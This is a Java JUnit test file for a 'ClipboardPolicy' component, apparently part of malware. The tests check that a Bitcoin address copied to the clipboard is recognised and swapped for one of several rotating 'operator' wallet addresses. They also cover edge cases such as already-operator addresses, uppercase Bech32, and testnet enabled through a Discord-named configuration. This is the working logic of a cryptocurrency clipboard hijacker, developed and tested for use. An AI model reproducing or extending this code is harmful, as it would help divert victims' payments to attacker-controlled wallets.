package com.spcagentpayloa.jvmxx;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

class ClipboardPolicyTest {
	private static final String A = "16L5yRNPTuciSgXGHqYwn9N6NeoKqopAu";
	private static final String B = "31nM1WuowNDzocNxPPW9NQWJEtwWpjfcLj";
	private static final String C = "1BoatSLRHtKNngkdXEeobR76b53LETtpyT";
	private static final String TESTNET = "tb1qqypqxpq9qcrsszg2pvxq6rs0zqg3yyc5r7fxez";

	@AfterEach
	void reset() {
		DiscordConfig.reset();
	}

	private Map<String, List<String>> coins(String... values) {
		Map<String, List<String>> map = new LinkedHashMap<>();
		map.put("btc", new ArrayList<>(List.of(values)));
		return map;
	}

	@Test
	void rotationSkipsOriginalAndWraps() {
		Map<String, List<String>> coins = coins(B, C);
		Map<String, Integer> rotation = new LinkedHashMap<>();
		var first = ClipboardPolicy.choose(A, coins, rotation);
		assertEquals(B, first.replacement());
		assertEquals(1, rotation.get("btc"));
		assertEquals(C, ClipboardPolicy.choose(A, coins, rotation).replacement());
		assertEquals(B, ClipboardPolicy.choose(A, coins, rotation).replacement());
	}

	@Test
	void singleAddressEqualToOriginalSkips() {
		assertNull(ClipboardPolicy.choose(A, coins(A), new LinkedHashMap<>()));
	}

	@Test
	void alreadyOperatorSkips() {
		assertNull(ClipboardPolicy.choose(B, coins(A, B), new LinkedHashMap<>()));
	}

	@Test
	void uppercaseBech32StaysUppercase() {
		String original = "BC1QQYPQXPQ9QCRSSZG2PVXQ6RS0ZQG3YYC5FCJ4Z3";
		Map<String, List<String>> map = new LinkedHashMap<>();
		map.put("btc", List.of("bc1pqypqxpq9qcrsszg2pvxq6rs0zqg3yyc5z5tpwxqergd3c8g7rusqwk0jyn"));
		var decision = ClipboardPolicy.choose(original, map, new LinkedHashMap<>());
		assertTrue(decision.replacement().equals(decision.replacement().toUpperCase()));
	}

	@Test
	void rejectsLongMultilineUrlsAndSpaces() {
		Map<String, List<String>> map = coins(B);
		assertNull(ClipboardPolicy.choose(A + "\n" + B, map, new LinkedHashMap<>()));
		assertNull(ClipboardPolicy.choose("https://example.com/" + A, map, new LinkedHashMap<>()));
		assertNull(ClipboardPolicy.choose(A + " " + B, map, new LinkedHashMap<>()));
		assertNull(ClipboardPolicy.choose("", map, new LinkedHashMap<>()));
		assertNull(ClipboardPolicy.choose("x".repeat(129), map, new LinkedHashMap<>()));
	}

	@Test
	void trimsWhitespace() {
		var decision = ClipboardPolicy.choose("  " + A + "  ", coins(B), new LinkedHashMap<>());
		assertEquals(B, decision.replacement());
		assertEquals(A, decision.original());
	}

	@Test
	void unknownTextSkips() {
		assertNull(ClipboardPolicy.choose("hola que tal", coins(A), new LinkedHashMap<>()));
		assertFalse(ClipboardPolicy.isOperatorAddress("nada", coins(A)));
	}

	@Test
	void testnetOnlyWhenConfigured() {
		assertNull(ClipboardPolicy.choose(TESTNET, coins(A), new LinkedHashMap<>()));
		DiscordConfig.provisioning(Map.of("clipboard", Map.of("testnet", true)));
		assertEquals(A, ClipboardPolicy.choose(TESTNET, coins(A), new LinkedHashMap<>()).replacement());
	}
}
